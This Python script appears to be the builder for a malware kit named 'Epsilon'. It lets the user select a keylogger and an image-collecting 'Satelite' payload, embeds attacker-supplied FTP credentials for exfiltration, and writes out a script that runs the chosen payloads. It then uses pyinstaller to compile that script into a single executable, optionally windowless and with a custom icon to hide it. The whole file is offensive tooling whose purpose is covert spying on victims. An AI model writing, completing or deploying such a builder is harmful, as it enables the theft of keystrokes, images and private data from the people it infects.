import threading 
import os


print("Welcome to Epsilon!!!\n")
print("Select yor payloads (seprated by spaces) :")
print("1.Satelite")
print("2.KeyLogger")

DEBUG = True


keys = input("Give option(s) : ")
DEBUG = bool(input("Debug mode(True/False) : "))
Name = input("Provide name of the binary : ")
list_keys = [int(k) for k in keys.split(' ')]

File = open(Name+'.py','w')
address = input("input ftp address : ")
username = input("input ftp username : ")
password = input("input ftp password : ")
File.write('from  network.ftpconn import init_creditinals\n')
File.write("init_creditinals(" + "\"" + address + "\",\"" + username + "\",\"" + password + "\")\n" )

iconfile = input("icon file for the binary (if not needed leave it) : ")

for i in list_keys:
    
    if i == 1 :
        File.write('from  payloads.satelite import collectimage\n')
        File.write('collectimage()\n')

    elif i == 2 :
        File.write('from  payloads.keylogger import log_to_ftp\n')
        File.write('log_to_ftp()\n')
        File.write('\n')


   
File.close()
Create_Binary = input("Do you want to compile and create binary of created payload? (Y/N)")

if Create_Binary == 'Y' or Create_Binary == 'y':
    cmd = "pyinstaller "+ Name+".py" + " -F"
    if not DEBUG :
        cmd = cmd + " --windowed"
    if iconfile is not "":
        cmd = cmd + " --icon="+iconfile
    os.system(cmd) 